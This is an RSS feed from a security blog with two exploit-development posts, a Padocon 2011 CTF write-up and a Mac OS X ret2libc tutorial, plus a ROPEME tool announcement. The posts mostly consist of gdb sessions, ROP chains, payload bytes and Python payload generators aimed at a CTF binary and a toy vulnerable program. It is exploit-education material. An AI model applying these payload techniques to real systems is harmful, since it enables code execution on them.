<?xml version="1.0" encoding="UTF-8" ?>

<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
   
   	<title>RealJenius.com - Tag: ropeme</title>
   
   <link>http://realjenius.com</link>
   <description>I'm a software developer in the game industry, and have been (for better or worse) coding on the Java platform for the last decade. I also do all my own stunts.</description>
   <language>en-us</language>
   <managingEditor>R.J. Lorimer</managingEditor>
   <atom:link href="rss" rel="self" type="application/rss+xml" />
   
	<item>
  <title>Padocon 2011 CTF Karma 400 exploit: the data re-use way</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2011/01/31/padocon-2011-ctf-karma-400-exploit-the-data-re-use-way.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2011-01-31T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2011/01/31/padocon-2011-ctf-karma-400-exploit-the-data-re-use-way.html</guid>
  <description><![CDATA[
     <p>Karma 400 at Padocon 2011 Online CTF is a fun challenge. The binary was provided without source code, you can reach its decompiled source at <a href="http://disekt.tk/node/39" target="_blank">disekt’s team writeup</a>. In that writeup, the solution was bruteforcing address of IO stdin buffer with return to do_system() trick. Karma 400 is different than other karma attackme:</p>

<ul>
  <li>It runs as a network daemon (via xinetd): so you cannot abuse its arguments and environments</li>
  <li>Input buffer is 200 bytes: you have room for payload (not only just overwrite saved EIP)</li>
  <li>There is a 10 seconds sleep before main() returns: this makes bruteforcing less effective</li>
</ul>

<p>In this post I will show how to exploit karma 400 with <a href="http://force.vnsecurity.net/download/longld/BHUS10_Paper_Payload_already_inside_data_reuse_for_ROP_exploits.pdf">data re-use method</a>.</p>

<pre class="brush: plain; title: ; notranslate" title="">$ gdb -q karma400_lolcosmostic
gdb$ pattern_create 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
gdb$ r
input: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
--------------------------------------------------------------------------[regs]
 EAX: 0x00000000  EBX: 0x41346141  ECX: 0xBFFFF384  EDX: 0x00B84FF4  o d I t S z a p c
 ESI: 0x00000000  EDI: 0x61413561  EBP: 0x62413961  ESP: 0xBFFFF3DC  EIP: 0x08048793
 CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
[0x007B:0xBFFFF3DC]------------------------------------------------------[stack]
0xBFFFF42C : 64 37 41 64 38 41 64 39 - 41 65 30 41 65 31 41 65 d7Ad8Ad9Ae0Ae1Ae
0xBFFFF41C : 41 64 32 41 64 33 41 64 - 34 41 64 35 41 64 36 41 Ad2Ad3Ad4Ad5Ad6A
0xBFFFF40C : 36 41 63 37 41 63 38 41 - 63 39 41 64 30 41 64 31 6Ac7Ac8Ac9Ad0Ad1
0xBFFFF3FC : 63 31 41 63 32 41 63 33 - 41 63 34 41 63 35 41 63 c1Ac2Ac3Ac4Ac5Ac
0xBFFFF3EC : 41 62 36 41 62 37 41 62 - 38 41 62 39 41 63 30 41 Ab6Ab7Ab8Ab9Ac0A
0xBFFFF3DC : 30 41 62 31 41 62 32 41 - 62 33 41 62 34 41 62 35 0Ab1Ab2Ab3Ab4Ab5
--------------------------------------------------------------------------1
=&gt; 0x8048793:    ret
 0x8048794:    nop
 0x8048795:    nop
 0x8048796:    nop
--------------------------------------------------------------------------------
0x08048793 in ?? ()
gdb$ x/x $esp
0xbffff3dc:    0x31624130

gdb$ pattern_offset 200 0x31624130
Searching for 0Ab1 in buf size 200
32
</pre>

<p>We have 200-32 = 168 bytes left for our payload. The goal is to execute a custom shell in /tmp, for this purpose I choose execv(“/tmp/v”, ptr_to_NULL).</p>

<p><strong>Step 1:</strong> transfer the string “/tmp/v” to un-used data region using chained strcpy() calls</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb$ x/32wx 0x08049a50
0x8049a50:    0x00000000    0x00000000    0x00000000    0x00000000
0x8049a60 &lt;stdin&gt;:    0x00b85440    0x00000000    0x00000000    0x00000000
0x8049a70:    0x00000000    0x00000000    0x00000000    0x00000000
0x8049a80 &lt;stdout&gt;:    0x00b854e0    0x00000000    0x00000000    0x00000000
0x8049a90:    0x00000000    0x00000000    0x00000000    0x00000000
0x8049aa0:    0x00000000    0x00000000    0x00000000    0x00000000
0x8049ab0:    0x00000000    0x00000000    0x00000000    0x00000000
0x8049ac0:    0x00000000    0x00000000    0x00000000    0x00000000

TARGET = 0x8049a90
NULLARGV = TARGET - 4

gdb$ info func strcpy@plt
All functions matching regular expression "strcpy@plt":

Non-debugging symbols:
0x080484f0  strcpy@plt

STRCPY = 0x080484f0

gdb$ x/4i 0x80485e3
 0x80485e3:    pop    ebx
 0x80485e4:    pop    ebp
 0x80485e5:    ret
 0x80485e6:    lea    esi,[esi+0x0]
gdb$

POP2RET = 0x80485e3

gdb$ findsubstr 0x08048000 0x08049000 "/tmp/v\x00"
Searching for '/tmp/vx00'
'/': 0x8048134
't': 0x80480f6
'm': 0x80482dc
'p': 0x8048313
'/': 0x8048134
'vx00': 0x80485e7

DATA1 = [0x8048134, 0x80480f6, 0x80482dc, 0x8048313, 0x8048134, 0x80485e7]
</pre>

<p>The payload will look like:<br />
[ STRCPY, POP2RET, TARGET, DATA1[0],  STRCPY, POP2RET, TARGET+1, DATA1<a href="http://force.vnsecurity.net/download/longld/BHUS10_Paper_Payload_already_inside_data_reuse_for_ROP_exploits.pdf">1</a>, … ]</p>

<p><strong>Step-2:</strong> overwrite GOT entry of puts() (or any function) with execv()<br />
This is a bit tricky, because libc address is ASCII ARMOR we cannot put execv() address directly on the payload. Fortunately, libc address is not randomized so we can directly overwrite GOT with execv() address using strcpy likes the data above.</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb$ p execv
$2 = {&lt;text variable, no debug info&gt;} 0xac4680 &lt;execv&gt;

EXECV = 0xac4680
gdb$ info functions puts@plt
All functions matching regular expression "puts@plt":

Non-debugging symbols:
0x08048540  puts@plt
gdb$ x/i 0x08048540
 0x8048540 &lt;puts@plt&gt;:    jmp    DWORD PTR ds:0x8049a48

PLTADDR = 0x08048540
GOTADDR = 0x8049a48

gdb$ findsubstr 0x08048000 0x08049000  0xac4680
Searching for 'x80Fxac'
'x80': 0x804803d
'F': 0x8048003
'xac': 0x80481b0

gdb$ findsubstr 0x08048000 0x08049000  0x00
Searching for 'x00'
'x00': 0x8048007

DATA2 = [0x804803d, 0x8048003, 0x80481b0, 0x8048007]
</pre>

<p>The payload will look like:<br />
[ STRCPY, POP2RET, GOTADDR, DATA2[0], STRCPY, POP2RET, GOTADDR+1, DATA2<a href="http://force.vnsecurity.net/download/longld/BHUS10_Paper_Payload_already_inside_data_reuse_for_ROP_exploits.pdf">1</a>, … ]</p>

<p>Finally, we make call to execv() via puts@plt:<br />
[ PLTADDR, 0xdeadbeef, TARGET, NULLARGV ]</p>

<p>We have a small problem, our payload size is 176. Each strcpy() call takes 16 bytes payload and there is 10 calls for data transfer, we have to reduce at least 1 call. We can tweak our custom shell a bit to reduce payload length, instead of “/tmp/v” we use “/tmp/ld-linux.so.2” so the last string to copy is “/ld-linux.so.2”.</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb$ findsubstr 0x08048000 0x0804a000  "/"
Searching for '/'
'/': 0x8048134
gdb$ x/s 0x8048134
0x8048134:     "/lib/ld-linux.so.2"
gdb$ x/s 0x8048138
0x8048138:     "/ld-linux.so.2"

DATA1 = [0x8048134, 0x80480f6, 0x80482dc, 0x8048313, 0x8048138]
</pre>

<p>Wrap things up and test:</p>

<pre class="brush: python; title: ; notranslate" title="">gdb$ shell python
Python 2.6.6 (r266:84292, Sep 15 2010, 15:52:39)
[GCC 4.4.5] on linux2
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; TARGET = 0x8049a90
&gt;&gt;&gt; NULLARGV = TARGET - 4
&gt;&gt;&gt; STRCPY = 0x080484f0
&gt;&gt;&gt; POP2RET = 0x80485e3
&gt;&gt;&gt; DATA1 = [0x8048134, 0x80480f6, 0x80482dc, 0x8048313, 0x8048138]
&gt;&gt;&gt; PAYLOAD = []
&gt;&gt;&gt; for i in range(len(DATA1)):
...     PAYLOAD += [STRCPY, POP2RET, TARGET+i, DATA1[i]]
...
&gt;&gt;&gt; for i in range(len(DATA2)):
...     PAYLOAD += [STRCPY, POP2RET, GOTADDR+i, DATA2[i]]
...
&gt;&gt;&gt; PAYLOAD += [PLTADDR, 0xdeadbeef, TARGET, NULLARGV]
&gt;&gt;&gt; len(PAYLOAD)
40
&gt;&gt;&gt; fd = open("payload", "wb")
&gt;&gt;&gt; import struct
&gt;&gt;&gt; fd.write("A"*32) # padding
&gt;&gt;&gt; for i in range(len(PAYLOAD)):
...     fd.write(struct.pack("&lt;I", PAYLOAD[i]))
...
&gt;&gt;&gt; fd.close()
&gt;&gt;&gt; ^D

gdb$ shell ln -s /usr/bin/id /tmp/ld-linux.so.2
gdb$ r &lt; payload
input: process 1866 is executing new program: /usr/bin/id

Program received signal SIGPIPE, Broken pipe.
</pre>

<p>Pwned!</p>

<p><em>Notes</em>:</p>

<ul>
  <li>This way can also be applied to exploit karma 500</li>
  <li>Disekt’s return to do_system() trick is really neat for local exploit</li>
</ul>


  ]]></description>
</item>

	<item>
  <title>Simple Mac OS X ret2libc exploit (x86)</title>
  <link>http://realjenius.com/research/2010/10/05/simple-mac-os-x-ret2libc-exploit-x86.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2010-10-05T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/research/2010/10/05/simple-mac-os-x-ret2libc-exploit-x86.html</guid>
  <description><![CDATA[
     <p>Talking about buffer overflow exploit on x86, Mac OS X is the most easy and hacker friendly target compare to Linux or Windows. OS X always loads **/usr/lib/dyld **at a fixed location and it contains a lot of helper stubs to launch the exploit. If you want something advanced likes ROP (Return-Oriented-Programming) exploit you may have a look at “<a href="http://trailofbits.com/2010/07/21/mac-os-x-return-oriented-exploitation/" target="_blank">Mac OS X Return-Oriented Exploitation</a>” and thorough step-by-step guide “<a href="http://www.exploit-db.com/osx-rop-exploits-evocam-case-study/" target="_blank">OSX ROP Exploit – EvoCam Case Study</a>“. But actually, we don’t need ROP for 32-bit exploitation on OS X, simple ret2libc is enough and straightforward to implement. Let take a look at multi-stage ret2libc exploit on OS X.</p>

<h2 id="the-target">The target</h2>

<p>Under OSX, dyld is always loaded at a fixed location with __IMPORT page is RWX as shown below:</p>

<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
  #__TEXT                 8fe00000-8fe0b000 [   44K] r-x/rwx SM=COW  /usr/lib/dyld
</div>

<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
  #__TEXT                 8fe0b000-8fe0c000 [    4K] r-x/rwx SM=PRV  /usr/lib/dyld
</div>

<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
  #__TEXT                 8fe0c000-8fe42000 [  216K] r-x/rwx SM=COW  /usr/lib/dyld
</div>

<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
  #__LINKEDIT             8fe70000-8fe84000 [   80K] r&#8211;/rwx SM=COW  /usr/lib/dyld
</div>

<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
  #__DATA                 8fe42000-8fe44000 [    8K] rw-/rwx SM=PRV  /usr/lib/dyld
</div>

<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
  #__DATA                 8fe44000-8fe6f000 [  172K] rw-/rwx SM=COW  /usr/lib/dyld
</div>

<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
  #__IMPORT               8fe6f000-8fe70000 [    4K] rwx/rwx SM=COW  /usr/lib/dyld
</div>

<pre><strong>__TEXT                 8fe00000-8fe0b000 [   44K] r-x/rwx SM=COW  /usr/lib/dyld</strong>
__TEXT                 8fe0b000-8fe0c000 [    4K] r-x/rwx SM=PRV  /usr/lib/dyld
__TEXT                 8fe0c000-8fe42000 [  216K] r-x/rwx SM=COW  /usr/lib/dyld
__LINKEDIT             8fe70000-8fe84000 [   80K] r--/rwx SM=COW  /usr/lib/dyld
__DATA                 8fe42000-8fe44000 [    8K] rw-/rwx SM=PRV  /usr/lib/dyld
__DATA                 8fe44000-8fe6f000 [  172K] rw-/rwx SM=COW  /usr/lib/dyld
<strong>__IMPORT               8fe6f000-8fe70000 [    4K] rwx/rwx SM=COW  /usr/lib/dyld</strong></pre>

<p><span style="font-family: Georgia, 'Times New Roman', 'Bitstream Charter', Times, serif;line-height: 19px;font-size: 13px">Our target is to transfer the desired shellcode to the __IMPORT section of dyld then execute it. We can simply do this with byte-per-byte copy way of <a href="http://www.vnsecurity.net/2010/08/ropeme-rop-exploit-made-easy/">ROPEME</a>. There is some disadvantages with this method:</span></p>

<p><span style="font-family: Georgia, 'Times New Roman', 'Bitstream Charter', Times, serif;line-height: 19px;font-size: 13px"> </span></p>

<ul>
  <li>Payload size is large, around 10 times of actual shellcode</li>
  <li>We have to re-generate the whole payload when changing to new shellcode</li>
</ul>

<p>With OS X we can do it better as there is a RWX page at static location.</p>

<h2 id="staging-payload">Staging payload</h2>

<p>The most complicated part of ROP technique is “stack pivoting” or ESP register control under ASLR. By executing a small shellcode we can take ESP under control easily. Our multi-stage payload will look like:</p>

<h3 id="stage-2-actual-shellcode">Stage-2: actual shellcode</h3>

<p>This is the last stage in our multi-stage payload. Any NULL-free shellcode can be used, e.g bind shell code from Metasploit.</p>

<h3 id="stage-1-shellcode-loader-for-stage-2-payload">Stage-1: shellcode loader for stage-2 payload</h3>

<p>This stage will transfer stage-2 payload on stack to __IMPORT section (RWX) of dyld then executes it. The transfer function is *_strcpy() *in dyld. Below small shellcode will be executed on RWX page to perform the job:</p>

<pre># 58                pop eax     # eax -&gt; TARGET
# 5B                pop ebx     # ebx -&gt; STRCPY
# 54                push esp    # src -&gt; &amp;shellcode
# 50                push eax    # dst -&gt; TARGET
# 50                push eax    # jump to TARGET when return from _strcpy()
# 53                push ebx    # STRCPY
# C3                ret         # execute _strcpy(TARGET, &amp;shellcode)</pre>

<h3 id="stage-0-ret2libc-loader-for-stage-1-payload">Stage-0: ret2libc loader for stage-1 payload</h3>

<p>This stage will transfer 7 bytes of stage-1 payload to our RWX location using repeated *_strcpy() *calls, then executes it. We lookups the dyld for necessary byte values and copy it to the target byte-per-byte.</p>

<p>In summary, there is some advantages with our multi-stage payload:</p>

<ul>
  <li>Straightforward to implement: only ret2libc calls, no gadget is required</li>
  <li>Payload size overhead is small: around 100 bytes</li>
  <li>Independent, generic loader code: no need to regenerate the whole payload, just append a new shellcode to make new payload</li>
</ul>

<h2 id="automated-payload-generator">Automated payload generator</h2>

<p>Let put all this together and make an automated payload generator in Python.</p>

<ul>
  <li>Select the target</li>
</ul>

<pre class="brush: python; title: ; notranslate" title="">#__IMPORT               8fe6f000-8fe70000 [    4K] rwx/rwx SM=COW  /usr/lib/dyld
TARGET = 0x8fe6f010 # to avoid NULL byte
# dyld base address
DYLDADDR = 0x8fe00000
</pre>

<ul>
  <li>Extract dyld’s i386 code</li>
</ul>

<pre class="brush: python; title: ; notranslate" title=""># $ otool -f /usr/lib/dyld
# ...
#architecture 1
#    cputype 7
#    cpusubtype 3
#    capabilities 0x0
#    offset 352256
#    size 368080
#    align 2^12 (4096)
# ...

DYLDFILE = "/usr/lib/dyld"
DYLDCODE = open(DYLDFILE, "rb").read()
DYLDCODE = DYLDCODE[352256 : 352256+368080]
</pre>

<ul>
  <li>_strcpy() call</li>
</ul>

<pre class="brush: python; title: ; notranslate" title=""># $ nm -arch i386 /usr/lib/dyld | grep _strcpy
# 8fe2db10 t _strcpy
STRCPY = 0x8fe2db10

# $ otool -arch i386 -tv /usr/lib/dyld | grep pop -A2 | grep ret -B1 | grep pop
# 8fe28790        popl    %edi
# 8fe2b3d4        popl    %edi
POP2RET = 0x8fe2878f
</pre>

<ul>
  <li>stage-1</li>
</ul>

<pre class="brush: python; title: ; notranslate" title=""># stage1
# 58                pop eax     # eax -&gt; TARGET
# 5B                pop ebx     # ebx -&gt; STRCPY
# 54                push esp    # dst -&gt; &amp;shellcode
# 50                push eax    # src -&gt; TARGET
# 50                push eax    # jump to TARGET when return from _strcpy()
# 53                push ebx    # STRCPY
# C3                ret         # execute _strcpy(TARGET, &amp;shellcode)

STAGE1 = "x58x5bx54x50x50x53xc3"
</pre>

<ul>
  <li>stage-0</li>
</ul>

<pre class="brush: python; title: ; notranslate" title=""># stage0: _strcpy sequences
STAGE0 = gen_stage0(DYLDCODE, STAGE1)
</pre>

<p>Below is the stage-0 payload loader generated for OS X 10.6.4:</p>

<pre class="brush: python; title: ; notranslate" title="">STAGE0 = (  "x10xdbxe2x8fx8fx87xe2x8fx10xf0xe6x8fx31x24xe1x8f"
            "x10xdbxe2x8fx8fx87xe2x8fx12xf0xe6x8fx32x01xe0x8f"
            "x10xdbxe2x8fx8fx87xe2x8fx13xf0xe6x8fx7ex21xe1x8f"
            "x10xdbxe2x8fx8fx87xe2x8fx15xf0xe6x8fx45x10xe0x8f"
            "x10xdbxe2x8fx8fx87xe2x8fx16xf0xe6x8fx44x10xe0x8f"
            "x10xf0xe6x8fx10xf0xe6x8fx10xdbxe2x8f" )
</pre>

<p>Test the payload with simple buffer overflow:</p>

<pre class="brush: plain; title: ; notranslate" title="">bash-3.2$ ./vuln "`python -c 'print "A"*272 + "x10xdbxe2x8fx8fx87xe2x8fx10xf0xe6x8fx31x24xe1x8fx10xdbxe2x8fx8fx87xe2x8fx12xf0xe6x8fx32x01xe0x8fx10xdbxe2x8fx8fx87xe2x8fx13xf0xe6x8fx7ex21xe1x8fx10xdbxe2x8fx8fx87xe2x8fx15xf0xe6x8fx45x10xe0x8fx10xdbxe2x8fx8fx87xe2x8fx16xf0xe6x8fx44x10xe0x8fx10xf0xe6x8fx10xf0xe6x8fx10xdbxe2x8f" + "xcc"*4'`

...

Trace/BPT trap

bash-3.2$

</pre>

<p>Looking for the next? Maybe “Mac OS X ROP exploit on x86_64″ someday.</p>

  ]]></description>
</item>

	<item>
  <title>ROPEME &#8211; ROP Exploit Made Easy</title>
  <link>http://realjenius.com/research/2010/08/13/ropeme-rop-exploit-made-easy.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2010-08-13T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/research/2010/08/13/ropeme-rop-exploit-made-easy.html</guid>
  <description><![CDATA[
     <p>ROPEME – ROP Exploit Made Easy – is a PoC tool for ROP exploit automation on Linux x86. It contains a set of simple Python scripts to generate and search for ROP gadgets from binaries and libraries (e.g libc). A sample payload class is also included to help generate multistage ROP payload with the technique described in the Black Hat USA 2010 talk: “<a title="Black Hat USA 2010 Media Archives" href="http://blackhat.com/html/bh-us-10/bh-us-10-archives.html#Le" target="_blank">Payload already inside: data re-use for ROP exploits</a>“.</p>

<p>Check the latest <a href="http://force.vnsecurity.net/download/longld/BHUS10_Paper_Payload_already_inside_data_reuse_for_ROP_exploits.pdf">paper</a> and <a href="http://force.vnsecurity.net/download/longld/BHUS10_Slides_Payload_already_inside_data_reuse_for_ROP_exploits_v1.pdf">slides</a> and PoC <a href="http://force.vnsecurity.net/download/longld/ropeme-bhus10.tbz2">code</a>.</p>

<p>And take a look at the demo video below:</p>

<p>Enjoy ROPing!</p>


  ]]></description>
</item>

</channel>
</rss>